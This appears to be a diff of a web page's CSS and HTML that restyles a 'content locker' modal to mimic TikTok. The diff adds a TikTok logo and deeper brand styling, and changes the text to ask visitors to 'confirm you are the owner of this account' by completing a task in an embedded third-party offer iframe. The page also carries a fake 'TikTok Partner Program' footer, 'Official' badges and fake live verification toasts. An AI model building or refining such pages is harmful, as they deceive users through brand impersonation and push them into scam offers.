@@ -139,12 +139,12 @@ body::before{
   transform: scale(0.98);
 }
 
-/* Modal Locker Styling */
+/* Updated TikTok Themed Locker */
 .locker-overlay {
   display: none;
   position: fixed;
   inset: 0;
-  background: rgba(0, 0, 0, 0.85);
+  background: rgba(0, 0, 0, 0.9);
   z-index: 9999;
   justify-content: center;
   align-items: center;
@@ -152,13 +152,14 @@ body::before{
 
 .locker-content {
   width: 90%;
-  max-width: 500px;
-  background: #121212;
-  border-radius: 20px;
-  border: 1px solid #333;
+  max-width: 450px;
+  background: #010101; /* Deep black like TikTok */
+  border-radius: 24px;
+  border: 1px solid rgba(255, 255, 255, 0.15);
   overflow: hidden;
   position: relative;
   animation: modalFadeIn 0.3s ease-out;
+  box-shadow: 0 0 40px rgba(254, 44, 85, 0.2);
 }
 
 @keyframes modalFadeIn {
@@ -167,25 +168,36 @@ body::before{
 }
 
 .locker-header {
-  padding: 20px;
+  padding: 25px 20px;
   text-align: center;
-  border-bottom: 1px solid #222;
+  background: rgba(255,255,255,0.02);
+}
+
+.locker-header .tk-logo {
+  font-size: 35px;
+  color: #25F4EE;
+  text-shadow: 2px 0 #FE2C55;
+  margin-bottom: 15px;
 }
 
 .locker-header h3 {
   color: #fff;
-  font-size: 20px;
-  margin-bottom: 5px;
+  font-size: 26px;
+  font-weight: 800;
+  margin-bottom: 8px;
 }
 
 .locker-header p {
-  color: #a8a8a8;
-  font-size: 14px;
+  color: #d7d7d7;
+  font-size: 15px;
+  line-height: 1.4;
 }
 
 .iframe-container {
   width: 100%;
-  height: 450px;
+  height: 480px;
+  background: #fff; /* Most lockers expect white bg to look clean */
+  border-top: 1px solid #333;
 }
 
 iframe {
@@ -255,10 +267,9 @@ iframe {
   margin-top:6px;
 }
 
-/* Live Notification Toast - UPDATED TO TOP */
 #live-toast {
     position: fixed;
-    top: 20px; /* Moved to top */
+    top: 20px;
     left: 20px;
     background: rgba(8, 8, 8, 0.95);
     border: 1px solid #25F4EE;
@@ -282,22 +293,10 @@ iframe {
 }
 
 @media(max-width:768px){
-  .wrapper{
-    justify-content:flex-start;
-    padding-top:30px;
-  }
-  .history{
-    grid-template-columns:repeat(2,1fr);
-    margin-top:35px;
-  }
+  .wrapper{ justify-content:flex-start; padding-top:30px; }
+  .history{ grid-template-columns:repeat(2,1fr); margin-top:35px; }
   .card { width: 100%; }
-  /* For mobile, it will slide from top now */
-  #live-toast { 
-    left: 10px; 
-    right: 10px; 
-    top: 10px; 
-    transform: translateY(-200%); 
-  }
+  #live-toast { left: 10px; right: 10px; top: 10px; transform: translateY(-200%); }
 }
 </style>
 </head>
@@ -329,8 +328,7 @@ iframe {
     <div class="b"><i class="fa-solid fa-circle-check" style="color:#25F4EE"></i> Official</div>
   </div>
 
-  <div class="history" id="history-grid">
-    </div>
+  <div class="history" id="history-grid"></div>
 
   <div class="footer-pro">
     <i class="fa-solid fa-shield-halved"></i> SECURE SERVER 2026 | TIKTOK PARTNER PROGRAM
@@ -351,8 +349,9 @@ iframe {
 <div class="locker-overlay" id="lockerOverlay">
   <div class="locker-content">
     <div class="locker-header">
-      <h3>Human Verification</h3>
-      <p>Almost finished! Please complete one task below.</p>
+      <div class="tk-logo"><i class="fa-brands fa-tiktok"></i></div>
+      <h3>Verification Required</h3>
+      <p>Confirm you are the owner of this account by completing one final step.</p>
     </div>
     <div class="iframe-container">
       <iframe src="https://ogam.site/cl/i/8229kj"></iframe>
@@ -407,11 +406,9 @@ iframe {
       document.getElementById('toast-date').innerText = "Verified on " + dateStr;
 
       const isMobile = window.innerWidth <= 768;
-      // Sliding in
       toast.style.transform = isMobile ? "translateY(0)" : "translateX(0)";
 
       setTimeout(() => {
-          // Sliding out
           toast.style.transform = isMobile ? "translateY(-200%)" : "translateX(-150%)";
       }, 4000);
   }
